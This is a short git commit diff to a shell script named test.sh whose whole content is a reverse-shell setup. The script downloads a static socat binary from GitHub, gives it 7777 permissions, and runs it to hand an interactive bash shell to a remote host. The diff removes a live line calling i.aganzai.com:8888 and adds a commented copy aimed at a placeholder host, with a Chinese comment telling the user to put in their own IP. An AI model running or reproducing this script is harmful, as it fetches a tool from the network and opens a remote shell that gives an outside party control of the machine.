aa7500fc2f930a6106754ecbfc43a1d8d14b7f22
kukutt <pan3yao@gmail.com>
2020-04-11 06:32:07 +0800

    none

--- test.sh
+++ test.sh
@@ -1,4 +1,7 @@
 #!/bin/bash
+echo tttttttttttttttttttttttttttttttttttttttttt
 wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
 chmod 7777 socat
-./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:i.aganzai.com:8888
+
+# xxxx.com记得换成自己ip
+#./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:xxxx.com:8888
